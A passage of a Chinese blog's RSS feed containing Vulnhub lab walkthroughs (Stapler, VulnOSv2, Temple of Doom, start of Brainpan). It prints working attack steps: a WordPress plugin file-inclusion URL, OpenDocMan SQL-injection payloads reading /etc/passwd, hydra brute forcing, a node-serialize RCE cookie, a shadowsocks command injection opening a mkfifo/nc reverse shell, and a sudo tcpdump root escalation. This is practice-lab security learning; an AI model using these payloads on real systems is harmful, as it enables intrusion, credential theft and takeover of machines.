&lt;generator&gt;http:&#x2F;&#x2F;wordpress.org&#x2F;?v&#x3D;4.2.1&lt;&#x2F;generator&gt;</span><br><span class="line"> |  - https:&#x2F;&#x2F;192.168.56.139:12380&#x2F;blogblog&#x2F;?feed&#x3D;comments-rss2, &lt;generator&gt;http:&#x2F;&#x2F;wordpress.org&#x2F;?v&#x3D;4.2.1&lt;&#x2F;generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: bhost</span><br><span class="line"> | Location: https:&#x2F;&#x2F;192.168.56.139:12380&#x2F;blogblog&#x2F;wp-content&#x2F;themes&#x2F;bhost&#x2F;</span><br><span class="line"> | Last Updated: 2019-12-08T00:00:00.000Z</span><br><span class="line"> | Readme: https:&#x2F;&#x2F;192.168.56.139:12380&#x2F;blogblog&#x2F;wp-content&#x2F;themes&#x2F;bhost&#x2F;readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 1.4.4</span><br><span class="line"> | Style URL: https:&#x2F;&#x2F;192.168.56.139:12380&#x2F;blogblog&#x2F;wp-content&#x2F;themes&#x2F;bhost&#x2F;style.css?ver&#x3D;4.2.1</span><br><span class="line"> | Style Name: BHost</span><br><span class="line"> | Description: Bhost is a nice , clean , beautifull, Responsive and modern design free WordPress Theme. This theme ...</span><br><span class="line"> | Author: Masum Billah</span><br><span class="line"> | Author URI: http:&#x2F;&#x2F;getmasum.net&#x2F;</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.2.9 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - https:&#x2F;&#x2F;192.168.56.139:12380&#x2F;blogblog&#x2F;wp-content&#x2F;themes&#x2F;bhost&#x2F;style.css?ver&#x3D;4.2.1, Match: &#39;Version: 1.2.9&#39;</span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="line"></span><br><span class="line">[i] No plugins Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Config Backups - Time: 00:00:00 &lt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt; (21 &#x2F; 21) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] No Config Backups Found.</span><br><span class="line"></span><br><span class="line">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 50 daily requests by registering at https:&#x2F;&#x2F;wpvulndb.com&#x2F;users&#x2F;sign_up</span><br></pre></td></tr></table></figure>

<p>wordpress 4.2.1好像并没有存在的exp。</p>
<p><code>https://192.168.56.139:12380/blogblog/xmlrpc.php</code>  存在xmldos攻击。不过对我们好像没什么作用</p>
<p><code>https://192.168.56.139:12380/blogblog/wp-content/themes/bhost/readme.txt</code> 点了一下，发现还有目录遍历<br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_164526.jpg" alt=""></p>
<p>看了一下插件<br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_164625.jpg" alt=""></p>
<p>搜索了一下，发现博客上面的advanced-video-embed-embed-videos-or-playlists插件版本是1.0并且存在文件包含。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_164747.jpg" alt=""><br>看了一下大神构造好的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;wordpress&#x2F;wp-admin&#x2F;admin-ajax.php?action&#x3D;ave_publishPost&amp;title&#x3D;random&amp;short&#x3D;1&amp;term&#x3D;1&amp;thumb&#x3D;[FILEPATH]</span><br></pre></td></tr></table></figure>
<p>修改成目标站点的uri就好了<br>尝试包含/etc/passwd,如果包含成功则会在上传目录下添加一个jpeg文件，并且首页会添加一个新的文章。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_165304.jpg" alt=""><br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_170008.jpg" alt=""><br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_165940.jpg" alt=""></p>
<p>下载目标文件，cat查看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;192.168.56.139:12380&#x2F;blogblog&#x2F;wp-content&#x2F;uploads&#x2F;2084215694.jpeg --no-check-certificate #不检查ssl证书</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200620_170134.jpg" alt=""></p>
<p>成功包含！，我觉得现在可以尝试包含wp-config。看数据库的帐号密码。对照着在smb共享目录中找到的wordpress.tar.gz知道wp-config.php不在wp-admin目录下，在blogblog的根目录下。(因为解压出来有个wp-config-sample.php)<br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_170929.jpg" alt=""></p>
<p>登录数据库成功。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_171858.jpg" alt=""></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200620_172001.jpg" alt=""></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200620_172605.jpg" alt=""></p>
<p>查看一些配置信息<br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_194430.jpg" alt=""></p>
<p>因为写文件的相关配置是空的，所以代表我们可以任意写文件到指定路径<br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_194535.jpg" alt=""></p>
<p>蚁剑连接成功（要先关闭https证书检查<br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_194720.jpg" alt=""></p>
<p>到这里我们已经获得了webshell了。是真的累。。</p>
<h3 id="爆破wordpress用户密码"><a href="#爆破wordpress用户密码" class="headerlink" title="爆破wordpress用户密码"></a>爆破wordpress用户密码</h3><p>观察结果，无效用户名<br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_165723.jpg" alt=""></p>
<p>确定用户名为john，并且没有设置重试次数。可以尝试爆破密码<br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_165803.jpg" alt=""></p>
<p>爆破用户密码<br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_165545.jpg" alt=""></p>
<p>登录之后尝试写一句话，但是不成功。因为主题模板文件不可写。。尝试安装主题也不行<br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_171541.jpg" alt=""><br>看起来是没有给够权限。</p>
<h3 id="提权-敏感信息泄露"><a href="#提权-敏感信息泄露" class="headerlink" title="提权-敏感信息泄露"></a>提权-敏感信息泄露</h3><p>对系统进行信息枚举后，发现一个特别的地方<br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_195033.jpg" alt=""></p>
<p>这里的居然是root执行的，觉得有点奇妙，去这个用户的家目录查看后，发现bash_history可读<br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_195244.jpg" alt=""></p>
<p>peter是uid1000的用户，他可能具有sudo权限。抱着这一想法，登录看看。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_195354.jpg" alt=""></p>
<p>感觉是相对比较轻松的提权了。。</p>
<h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><p>查看系统内核信息后，发现是4.4.0.21内核的ubuntu系统<br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_195521.jpg" alt=""></p>
<p>搜索exp库，好像还挺多的。有搞头？<br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_195609.jpg" alt=""><br>排除掉x64和不符合的版本后，只剩下</p>
<ul>
<li>39772.txt</li>
<li>43418.c</li>
<li>47169.c</li>
<li>44298.c</li>
</ul>
<p>最后选择了39772.txt，漏洞编号:<a href="https://www.exploit-db.com/exploits/39772" title="" target="">CVE-2016-4557</a>。照着exp的说明去做，先运行compile.sh编译后，执行doubleput就可以拿到root权限了。这个漏洞还是谷歌的零日计划团队发现的<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=808" title="" target="">Issue 808: Linux: UAF via double-fdput() in bpf(BPF_PROG_LOAD) error path</a><br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_200026.jpg" alt=""></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="https://images.atsud0.me/images/post/Screenshot_20200620_201031.jpg" alt=""></p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>Vulnhub</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>sambacry</tag>
        <tag>mysql</tag>
        <tag>CVE-2016-4557</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub-VulnOSv2</title>
    <url>/2020/06/21/Vulnhub-VulnOSv2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>靶机清单之一。<br>下载链接：<a href="https://www.vulnhub.com/entry/vulnos-2,147/" target="_blank" rel="noopener">VulnOS 2</a></p>
<a id="more"></a>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描<br><img src="https://images.atsud0.me/images/post/Screenshot_20200621_134041.jpg" alt=""></p>
<p>nikto<br><img src="https://images.atsud0.me/images/post/Screenshot_20200621_134211.jpg" alt=""></p>
<p>首页已经给了网站链接。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200621_193746.jpg" alt=""></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200621_193504.jpg" alt=""></p>
<p>访问/jabcd0cs/，并且用户名密码都可以是guest</p>
<p>登录进去之后，以为能上传getshell，搞了半天都不行。。上传的文件，在uploads下都变成了bat后缀</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>opendocman版本是1.2.7的。检索exp数据库看到有个注入，尝试注入</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200621_192953.jpg" alt=""></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200621_152624.jpg" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.56.104&#x2F;jabcd0cs&#x2F;ajax_udf.php?q&#x3D;1&amp;add_value&#x3D;odm_user%20UNION%20SELECT%201,group_concat(schema_name),3,4,5,6,7,8,9 from information_schema.schemata</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200621_153142.jpg" alt=""></p>
<p>注入…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.56.104&#x2F;jabcd0cs&#x2F;ajax_udf.php?q&#x3D;1&amp;add_value&#x3D;odm_user%20UNION%20SELECT%201,group_concat(schema_name),3,4,5,6,7,8,9 from information_schema.schemata</span><br><span class="line">http:&#x2F;&#x2F;192.168.56.104&#x2F;jabcd0cs&#x2F;ajax_udf.php?q&#x3D;1&amp;add_value&#x3D;odm_user%20UNION%20SELECT%201,group_concat(table_name),3,4,5,6,7,8,9 from information_schema.tables where table_name&#x3D;database()</span><br><span class="line">http:&#x2F;&#x2F;192.168.56.104&#x2F;jabcd0cs&#x2F;ajax_udf.php?q&#x3D;1&amp;add_value&#x3D;odm_user%20UNION%20SELECT%201,group_concat(column_name),3,4,5,6,7,8,9%20from%20information_schema.columns%20where%20table_schema&#x3D;database()%20and%20table_name&#x3D;CHAR(111, 100, 109, 95, 117, 115, 101, 114)</span><br><span class="line">http:&#x2F;&#x2F;192.168.56.104&#x2F;jabcd0cs&#x2F;ajax_udf.php?q&#x3D;1&amp;add_value&#x3D;odm_user%20UNION%20SELECT%201,group_concat(username),3,4,5,6,7,8,9%20from%20odm_user</span><br><span class="line">http:&#x2F;&#x2F;192.168.56.104&#x2F;jabcd0cs&#x2F;ajax_udf.php?q&#x3D;1&amp;add_value&#x3D;odm_user%20UNION%20SELECT%201,group_concat(password),3,4,5,6,7,8,9%20from%20odm_user</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20200621_194045.jpg" alt=""></p>
<ul>
<li>b78aae356709f8c31118ea613980954b</li>
<li>084e0343a0486ff05530df6c705c8bb4(guest)</li>
</ul>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200621_194244.jpg" alt=""></p>
<p>读取/etc/passwd文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.56.104&#x2F;jabcd0cs&#x2F;ajax_udf.php?q&#x3D;1&amp;add_value&#x3D;odm_user%20UNION%20SELECT%201,load_file(0x2f6574632f706173737764),3,4,5,6,7,8,9</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200621_194630.jpg" alt=""><br>发现也有一个webmin用户，尝试使用爆破出来的密码连接。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200621_194741.jpg" alt=""><br>登录成功</p>
<hr>
> 信息枚举中..............
<hr>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>内核信息<br><img src="https://images.atsud0.me/images/post/Screenshot_20200621_194931.jpg" alt=""></p>
<p>通过这个内核信息，检索漏洞利用库。感觉37292和37293很有戏。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200621_195040.jpg" alt=""></p>
<p>利用<a href="https://www.exploit-db.com/exploits/37292" target="_blank" rel="noopener">exp:37292.c</a><br><img src="https://images.atsud0.me/images/post/Screenshot_20200621_172100.jpg" alt=""></p>
<p>成功提权。</p>
<h2 id="另外的提权方式"><a href="#另外的提权方式" class="headerlink" title="另外的提权方式"></a>另外的提权方式</h2><p>看了其他大佬写的writeup发现还有另外一种提权方法。<a href="https://g0blin.co.uk/vulnos-2-vulnhub-writeup/" target="_blank" rel="noopener">原文</a></p>
<p>同样是通过注入拿到webmin的密码，然后ssh连接上来。</p>
<p>因为一登入，就有一个post.tar.gz的压缩包，解压后是hydra的源码。有可能是要爆破什么东西。<br>检索正在运行的服务，发现还有一个<code>postgresql</code></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200621_202518.jpg" alt=""></p>
<p>退出，重新连接将目标机器的5432端口的转发到本地5432端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh webmin@192.168.56.104 -L 5432:localhost:5432</span><br><span class="line">hydra -L &#96;(locate postgres_default_user.txt)&#96; -P &#96;(locate postgres_default_pass.txt)&#96; -s 5432 127.0.0.1 postgres -vvv</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200621_204434.jpg" alt=""></p>
<p>之后转储能访问的数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PGPASSWORD&#x3D;&quot;postgres&quot; pg_dumpall -U postgres -h localhost -p 5432</span><br><span class="line"></span><br><span class="line">...........一大段信息...........</span><br><span class="line">-- Data for Name: users; Type: TABLE DATA; Schema: public; Owner: postgres</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">COPY public.users (&quot;ID&quot;, username, password) FROM stdin;</span><br><span class="line">1       vulnosadmin     c4nuh4ckm3tw1c3</span><br><span class="line">\.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Name: users users_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres</span><br><span class="line">--</span><br><span class="line">...........一大段信息...........</span><br></pre></td></tr></table></figure>


<p><img src="https://images.atsud0.me/images/post/Screenshot_20200621_204642.jpg" alt=""></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200621_204712.jpg" alt=""></p>
<p>root.blend这个文件，它是一个3D模型文件。里面就是root用户的密码。</p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>Vulnhub</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>sql_injection</tag>
        <tag>hydra</tag>
        <tag>ssh</tag>
        <tag>opendocman</tag>
        <tag>CVE-2015-1328</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub-Tempale-of-Doom</title>
    <url>/2020/07/22/Vulnhub-Tempale-of-Doom/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a href="https://www.vulnhub.com/entry/temple-of-doom-1,243/" target="_blank" rel="noopener">靶机下载链接</a></p>
<a id="more"></a>


<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><h3 id="NMAP扫描"><a href="#NMAP扫描" class="headerlink" title="NMAP扫描"></a>NMAP扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-07-18 16:12 CST</span><br><span class="line">Nmap scan report for 192.168.56.7</span><br><span class="line">Host is up (0.00023s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp  open  ssh     OpenSSH 7.7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 95:68:04:c7:42:03:04:cd:00:4e:36:7e:cd:4f:66:ea (RSA)</span><br><span class="line">|   256 c3:06:5f:7f:17:b6:cb:bc:79:6b:46:46:cc:11:3a:7d (ECDSA)</span><br><span class="line">|_  256 63:0c:28:88:25:d5:48:19:82:bb:bd:72:c6:6c:68:50 (ED25519)</span><br><span class="line">666&#x2F;tcp open  http    Node.js Express framework</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html; charset&#x3D;utf-8).</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 16.66 seconds</span><br></pre></td></tr></table></figure>

<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><ul>
<li>22 ssh只能爆破了吧</li>
<li>666 是http服务，估计只能从这里入手了。</li>
</ul>
<h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><h4 id="nikto扫描"><a href="#nikto扫描" class="headerlink" title="nikto扫描"></a>nikto扫描</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nikto -h http:&#x2F;&#x2F;192.168.56.7:666</span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.56.7</span><br><span class="line">+ Target Hostname:    192.168.56.7</span><br><span class="line">+ Target Port:        666</span><br><span class="line">+ Start Time:         2020-07-18 16:17:07 (GMT8)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: No banner retrieved</span><br><span class="line">+ Retrieved x-powered-by header: Express</span><br><span class="line">+ Server leaks inodes via ETags, header found with file &#x2F;, fields: 0xW&#x2F;24 0xxWt5IUP3GfGbHraPgY5EGPpcNzA</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br><span class="line">+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)</span><br><span class="line">+ Allowed HTTP Methods: GET, HEAD</span><br><span class="line">+ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response</span><br><span class="line">+ Scan terminated:  20 error(s) and 6 item(s) reported on remote host</span><br><span class="line">+ End Time:           2020-07-18 16:17:21 (GMT8) (14 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure>

<p>nikto扫描没发现什么东西</p>
<h4 id="666端口"><a href="#666端口" class="headerlink" title="666端口"></a>666端口</h4><p>访问后是这个东西，不知道是什么。抓包看看<br><img src="https://images.atsud0.me/images/post/Screenshot_20200722_163051.jpg" alt=""></p>
<p>设置了一段cookie，但是如果携带这个cookie访问之后，就会报错。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200722_163009.jpg" alt=""></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200722_163257.jpg" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;Admin&quot;,&quot;csrftoken&quot;:&quot;u32t4o3tb3gg431fs34ggdgchjwnza0l&#x3D;&quot;,&quot;Expires&#x3D;&quot;:Friday, 13 Oct 2018 00:00:00 GMTIn0%3D</span><br></pre></td></tr></table></figure>
<p>改为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;Admin&quot;,&quot;csrftoken&quot;:&quot;u32t4o3tb3gg431fs34ggdgchjwnza0l&#x3D;&quot;,&quot;Expires&#x3D;&quot;:&quot;Friday, 13 Oct 2018 00:00:00 GMT&quot;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200722_180105.jpg" alt=""></p>
<p>修改错误的值后重新编码，成功访问。但是好像没什么用。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200722_175644.jpg" alt=""></p>
<p>结合这个数组，让我想起了反序列化，但是我个人是没有怎么研究过反序列化的(太菜了~，随即去谷歌了一下nodejs反序列化。</p>
<p>很幸运，找到了几篇利用方法。</p>
<ul>
<li><a href="https://paper.seebug.org/213/#_4" target="_blank" rel="noopener">利用 Node.js 反序列化漏洞远程执行代码</a></li>
<li><a href="https://www.anquanke.com/post/id/157920" target="_blank" rel="noopener"> Node.js 反序列化远程代码执行分析 </a></li>
</ul>
<p>将以下生成的代码与调用rce结合一下。并将其编码成base64放入cookie中。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200722_182222.jpg" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function ()&#123;生成的代码丢这里&#125;()&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>成功get shell<br><img src="https://images.atsud0.me/images/post/Screenshot_20200722_182145.jpg" alt=""></p>
<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>利用nodejs的反序列化远程命令执行漏洞，成功getshell</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200722_154228.jpg" alt=""></p>
<p>查询/etc/passwd，发现还存在另外的一个用户<code>fireman</code><br><img src="https://images.atsud0.me/images/post/Screenshot_20200722_154640.jpg" alt=""></p>
<p>查看正在运行的程序，发现ss-manager。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200722_155647.jpg" alt=""></p>
<p>谷歌了一下之后发现是shadowsocks的启动程序。。查询目标机器的运行版本后，是3.1</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200722_155838.jpg" alt=""></p>
<p>找到该版本的exp。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200722_155941.jpg" alt=""></p>
<p>利用方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -u 127.0.0.1 8839</span><br><span class="line">    add: &#123;&quot;server_port&quot;:8003, &quot;password&quot;:&quot;test&quot;, &quot;method&quot;:&quot;||touch &#x2F;tmp&#x2F;evil||&quot;&#125;</span><br></pre></td></tr></table></figure>
<p><code>&quot;method&quot;:&quot;||touch/tmp/evil||&quot;}</code> touch /tmp/evil这个地方就是要运行的命令。将这个地方改成反弹shell的命令就好了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -u 127.0.0.1 8839</span><br><span class="line">add: &#123;&quot;server_port&quot;:8003, &quot;password&quot;:&quot;test&quot;, &quot;method&quot;:&quot;||rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.56.254 4444 &gt;&#x2F;tmp&#x2F;f||&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>成功越权到fireman用户，并且我们也知道了fireman用户拥有<code>sudo tcpdump</code>的权限。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200722_160352.jpg" alt=""></p>
<p>在GTFOBINS中查询到tcpdump能够sudo越权。<a href="https://gtfobins.github.io/gtfobins/tcpdump/" target="_blank" rel="noopener">gtfobins-tcpdump</a></p>
<p>利用方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">COMMAND&#x3D;&#39;id&#39;</span><br><span class="line">TF&#x3D;$(mktemp)</span><br><span class="line">echo &quot;$COMMAND&quot; &gt; $TF</span><br><span class="line">chmod +x $TF</span><br><span class="line">sudo tcpdump -ln -i lo -w &#x2F;dev&#x2F;null -W 1 -G 1 -z $TF -Z root</span><br></pre></td></tr></table></figure>

<p><strong>这里注意一下，最好将 -i lo 改为eth0</strong>，不知道什么原因，如果使用lo本地回环的话，程序将会僵死在那里。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200722_183026.jpg" alt=""></p>
<p>成功利用。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200722_182848.jpg" alt=""></p>
<p>我这里尝试直接打开bash和sh发现是失败的，因为tcpdump的这个命令不支持交互性的命令，所以最好用弹shell的方式。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200722_183505.jpg" alt=""></p>
<p>接下来只需要将$TF管道文件的内容改为弹shell的命令，就可以get root shell了。</p>
<h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><p>提权至root用户成功。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200722_154314.jpg" alt=""></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200722_154400.jpg" alt=""></p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>Vulnhub</category>
      </categories>
      <tags>
        <tag>tcpdump</tag>
        <tag>nodejs-serialize</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub-brainpan-1(缓冲区溢出)</title>
    <url>/2020/06/25/Vulnhub-brainpan-1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>缓冲区溢出的靶机，同样也是类OSCP机器。<br><a href="https://www.vulnhub.com/entry/brainpan-1,51/" target="_blank" rel="noopener">靶机下载地址</a></p>
<a id="more"></a>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-06-24 23:17 EDT</span><br><span class="line">Nmap scan report for 192.168.56.4</span><br><span class="line">Host is up (0.00052s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">9999&#x2F;tcp  open  abyss?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   NULL: </span><br><span class="line">|     _| _| </span><br><span class="line">|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| </span><br><span class="line">|     _|_| _| _| _| _| _| _| _| _| _| _| _|</span><br><span class="line">|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|</span><br><span class="line">|     [________________________ WELCOME TO BRAINPAN _________________________]</span><br><span class="line">|_    ENTER THE PASSWORD</span><br><span class="line">10000&#x2F;tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html).</span><br><span class="line">1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">SF-Port9999-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;6&#x2F;24%Time&#x3D;5EF41741%P&#x3D;x86_64-pc-linux-gnu%r(NU</span><br><span class="line">SF:LL,298,&quot;_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><br><span 